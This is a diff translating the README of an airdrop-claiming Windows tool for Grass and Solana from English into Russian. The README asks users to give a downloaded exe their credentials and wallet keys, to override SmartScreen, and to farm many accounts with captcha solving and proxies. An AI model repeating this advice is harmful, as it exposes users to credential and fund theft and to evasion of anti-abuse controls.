@@ -1,160 +1,158 @@
-# GrassSolAPP - Grass Season 2 Airdrop Claimer
+# GrassSolAPP - Клеймер Airdrop Grass Season 2
 
-A comprehensive automation tool for Grass.io airdrop claiming and Solana wallet management. This application provides a complete suite of modules for managing Grass accounts, claiming airdrops, and handling Solana transactions.
+Комплексный инструмент автоматизации для клейма airdrop Grass.io и управления кошельками Solana. Это приложение предоставляет полный набор модулей для управления аккаунтами Grass, получения airdrop и обработки транзакций Solana.
 
 ![License](https://img.shields.io/badge/license-MIT-blue.svg)
 ![Platform](https://img.shields.io/badge/platform-Windows-blue.svg)
 ![Node](https://img.shields.io/badge/node-%3E%3D18.0.0-brightgreen.svg)
 
-## 🙏 Acknowledgments
+## 🙏 Благодарности
 
-**Author:** [@div_engine](https://t.me/div_engine) on Telegram
+**Автор:** [@div_engine](https://t.me/div_engine) в Telegram
 
-## 🚀 Download
+## 🚀 Скачать
 
-Download the latest version of the application below:
+Скачайте последнюю версию приложения ниже:
 
-[📥 Download GrassSolApp](https://github.com/div-engine/Grass-Season-2-Airdrop-Claimer/releases/tag/1.0)
+[📥 Скачать GrassSolApp](https://github.com/div-engine/Grass-Season-2-Airdrop-Claimer/releases/tag/1.0)
 
-## 🚀 Features
+## 🚀 Возможности
 
-- **Web-based Dashboard** - Clean, intuitive interface for all operations
-- **Multi-Account Management** - Handle hundreds of Grass accounts simultaneously
-- **Automated Wallet Function, USDC Claiming, ATA RENT RETURNING & COLLECTION SOL/USDC TO MAIN WALLET** - Headless airdrop claiming with Merkle proof verification
-- **Proxy Support** - HTTP/SOCKS5 proxy rotation with auto-healing
-- **No License Required** - Completely free and
+- **Веб-панель управления** - Чистый, интуитивный интерфейс для всех операций
+- **Управление множеством аккаунтов** - Обрабатывайте сотни аккаунтов Grass одновременно
+- **Автоматическая функция кошелька, клейм USDC, возврат ATA RENT и сбор SOL/USDC на основной кошелек** - Автоматический клейм airdrop с проверкой Merkle proof
+- **Поддержка прокси** - Ротация HTTP/SOCKS5 прокси с автоматическим восстановлением
+- **Лицензия не требуется** - Полностью бесплатно
 
 ---
 
-## 📦 Quick Start
+## 📦 Быстрый старт
 
-### Download & Run
+### Скачать и запустить
 
-1. Download all files
-2. Fill required config.json data (captcha api_key, rpc if need)
-3. Run `GrassSol.exe`
-4. The application will start automatically
-5. Open your browser to **http://localhost:5555**
-6. Use the web interface to manage all operations
+1. Скачайте все файлы
+2. Заполните необходимые данные в config.json (api_key для капчи, rpc если нужно)
+3. Запустите `GrassSol.exe`
+4. Приложение запустится автоматически
+5. Откройте браузер по адресу **http://localhost:5555**
+6. Используйте веб-интерфейс для управления всеми операциями
 
-### Requirements
+### Требования
 
 - **Windows 7/8/10/11** (x64)
-- No installation required - just download and run!
-- No Node.js, Python, or any dependencies needed
+- Установка не требуется - просто скачайте и запустите!
+- Node.js, Python или любые зависимости не нужны
 
 ---
 
-## 📚 Module Documentation
+## 📚 Документация модулей
 
-#### 1. **Account Login by Pass & EMail**
+#### 1. **Вход в аккаунт по паролю и Email**
 
 <img width="730" height="1055" alt="1" src="https://github.com/user-attachments/assets/795f49a3-6756-4858-bed9-cd1dff8001a1" />
 
-Generate authentication tokens from account credentials.
+Генерация токенов аутентификации из учетных данных аккаунта.
 
-**Required Files:**
-- userData/data/accs.txt [Format: account_email:account_pass] for **Login by Pass** module
-- userData/data/accs.txt [Format: email:email_pass:account_email] for **Login by Email** module
-- userData/data/proxies.txt [Formats: http(socks5)://user:pass@ip:port, http(socks5)://ip:port:user:pass]
-- userData/config.json [Captcha settings]
-- One account per line
+**Необходимые файлы:**
+- userData/data/accs.txt [Формат: account_email:account_pass] для модуля **Login by Pass**
+- userData/data/accs.txt [Формат: email:email_pass:account_email] для модуля **Login by Email**
+- userData/data/proxies.txt [Форматы: http(socks5)://user:pass@ip:port, http(socks5)://ip:port:user:pass]
+- userData/config.json [Настройки капчи]
+- По одному аккаунту на строку
 
-**Features:**
-- Automatic login and token extraction
-- Session management
-- Token refresh
-- Bulk import support
-- Broken Proxy change
-- **Automatic captcha solving** (2Captcha/CapMonster/CapSolver)
+**Возможности:**
+- Автоматический вход и извлечение токена
+- Управление сессиями
+- Обновление токенов
+- Поддержка массового импорта
+- Замена сломанных прокси
+- **Автоматическое решение капчи** (2Captcha/CapMonster/CapSolver)
 
-**Requirements:**
-- Valid captcha service API key configured in `config.json`
+**Требования:**
+- Действительный API ключ сервиса капчи настроенный в `config.json`
 
-**Input File:** `userData/data/accs.txt`
+**Входной файл:** `userData/data/accs.txt`
 
 ---
 
-#### 2. **Airdrop Claim (USDC)**
+#### 2. **Клейм Airdrop (USDC)**
 
 <img width="715" height="825" alt="2" src="https://github.com/user-attachments/assets/6dccc889-055a-4ad9-a463-a366f517b742" />
 
-**Claim USDC airdrop from all wallets (accounts) and collect USDT/SOL to Main Wallet automatically!**
+**Клейм USDC airdrop со всех кошельков (аккаунтов) и автоматический сбор USDT/SOL на основной кошелек!**
 
-**Features:**
-- Fund account wallets from main wallet
-- Claim **USDC**
-- Closing **ATA RENT**
-- Collecting back to **Main** wallet all balance **SOL/USDC** from all wallets
-- Updating Grass account broken **passwords** with new ones
+**Возможности:**
+- Пополнение кошельков аккаунтов с основного кошелька
+- Клейм **USDC**
+- Закрытие **ATA RENT**
+- Автоматический сбор всего баланса **SOL/USDC** со всех кошельков на **основной** кошелек
+- Обновление сломанных **паролей** аккаунтов Grass новыми
 
-Overall Fees for 1 Claim: **~0.00132 SOL**
+Общие комиссии за 1 клейм: **~0.00132 SOL**
 
-**Required Files:**
-- userData/data/tokens.txt [Format: email - token]
-- userData/data/emails.txt [Format: email:email_pass:account_email:account_pass]
-- userData/config.json [IMAP settings]
-- userData/wallets/wallet-main.txt [Main wallet — needs ~0.008 SOL per un-claimed account]
+**Необходимые файлы:**
+- userData/data/tokens.txt [Формат: email - token]
+- userData/data/emails.txt [Формат: email:email_pass:account_email:account_pass]
+- userData/config.json [Настройки IMAP]
+- userData/wallets/wallet-main.txt [Основной кошелек — требуется ~0.008 SOL на каждый не заклейменный аккаунт]
 
-Notice: **$0.01** from each claim will go to `Developer Fund`
+Примечание: **$0.01** с каждого клейма пойдет в `Фонд разработчика`
 
 ---
 
-#### 3. **Allocation Checker**
+#### 3. **Проверка выделения**
 
 <img width="721" height="1014" alt="3" src="https://github.com/user-attachments/assets/ce2cad2e-f9d3-4e04-b3af-5b8363dc72d5" />
 
-Bulk check Airdrop Allocation for all accounts.
+Массовая проверка выделения Airdrop для всех аккаунтов.
 
-**Required Files:**
-- Required Files:
-- userData/data/tokens.txt [Format: email - token]
-- userData/data/proxies.txt [Formats: http(socks5)://user:pass@ip:port, http(socks5)://ip:port:user:pass]
+**Необходимые файлы:**
+- userData/data/tokens.txt [Формат: email - token]
+- userData/data/proxies.txt [Форматы: http(socks5)://user:pass@ip:port, http(socks5)://ip:port:user:pass]
 
-#### 3. **Up TO Date Checker**
+#### 3. **Проверка актуальности версии**
 
-Bulk check latest updated version for both apps.
+Массовая проверка последней обновленной версии для обоих приложений.
 
-**Required Files:**
-- Required Files:
-- userData/data/tokens.txt [Format: email - token]
-- userData/data/proxies.txt [Formats: http(socks5)://user:pass@ip:port, http(socks5)://ip:port:user:pass]
+**Необходимые файлы:**
+- userData/data/tokens.txt [Формат: email - token]
+- userData/data/proxies.txt [Форматы: http(socks5)://user:pass@ip:port, http(socks5)://ip:port:user:pass]
 
 ---
 
-### Common Issues
+### Частые проблемы
 
-#### Application Won't Start
-- **Solution:** Right-click `GrassSol.exe` → "Run as Administrator"
-- Check Windows Firewall settings
-- If Windows SmartScreen blocks it: Click "More info" → "Run anyway"
+#### Приложение не запускается
+- **Решение:** Нажмите правой кнопкой на `GrassSol.exe` → "Запуск от имени администратора"
+- Проверьте настройки брандмауэра Windows
+- Если Windows SmartScreen блокирует: нажмите "Подробнее" → "Выполнить в любом случае"
 
-#### RPC Errors (429 Rate Limit)
-- **Solution:** Add premium RPC endpoints to `config.json`
-- Reduce concurrency in claim settings
-- Wait and retry during off-peak hours
+#### Ошибки RPC (429 Rate Limit)
+- **Решение:** Добавьте премиум RPC endpoints в `config.json`
+- Уменьшите параллелизм в настройках клейма
+- Подождите и повторите попытку в непиковые часы
 
-#### Proxy Connection Fails
-- **Solution:** Check proxy format: `protocol://ip:port` or `protocol://user:pass@ip:port`
-- Supported: `http://`, `https://`, `socks4://`, `socks5://`
-- Test proxies individually before adding to list
+#### Сбой подключения к прокси
+- **Решение:** Проверьте формат прокси: `protocol://ip:port` или `protocol://user:pass@ip:port`
+- Поддерживаются: `http://`, `https://`, `socks4://`, `socks5://`
+- Протестируйте прокси индивидуально перед добавлением в список
 
-#### "Insufficient SOL for Transaction"
-- Minimum required: ~0.008 SOL per wallet
-
----
-
-## 📜 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+#### "Недостаточно SOL для транзакции"
+- Минимально требуется: ~0.008 SOL на кошелек
 
 ---
 
-## ⚠️ Disclaimer
+## 📜 Лицензия
 
-This software is provided "as is", without warranty of any kind. Use at your own risk.
+Этот проект лицензирован под лицензией MIT - смотрите файл [LICENSE](LICENSE) для подробностей.
 
-- **Not Financial Advice** - This tool is for educational and automation purposes only
-- **No Guarantees** - Airdrop eligibility and amounts are determined by Grass.io
-- **User Responsibility** - You are responsible for securing your private keys and accounts
-- **Compliance** - Ensure your use complies with Grass.io Terms of Service and local laws
+---
+
+## ⚠️ Отказ от ответственности
+
+Это программное обеспечение предоставляется "как есть", без каких-либо гарантий. Используйте на свой риск.
+
+- **Не финансовый совет** - Этот инструмент предназначен только для образовательных и автоматизационных целей
+- **Без гарантий** - Право на airdrop и суммы определяются Grass.io
+- **Ответственность пользователя** - Вы несете ответственность за безопасность своих приватных ключей и аккаунтов
+- **Соответствие** - Убедитесь, что ваше использование соответствует Условиям обслуживания Grass.io и местным законам
